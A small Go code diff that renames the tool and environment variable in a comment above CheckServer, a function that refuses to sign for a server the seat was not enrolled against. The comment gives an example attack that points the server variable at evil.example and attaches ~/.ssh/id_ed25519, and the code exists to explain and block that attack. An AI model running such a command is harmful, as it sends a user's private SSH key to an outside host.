@@ -40,7 +40,7 @@ func safeName(actor string) string {
 }
 
 // CheckServer refuses to sign for a hub the seat did not enrol against.
-// `AGENT_COMMS_SERVER=http://evil.example agent-comms attach ~/.ssh/id_ed25519`
+// `COMMS_SERVER=http://evil.example comms attach ~/.ssh/id_ed25519`
 // needs no key material, leaves nothing in argv, and is indistinguishable from
 // ordinary use — so the seat file is authoritative and the environment is not.
 func CheckServer(e *Env, actor string) int {
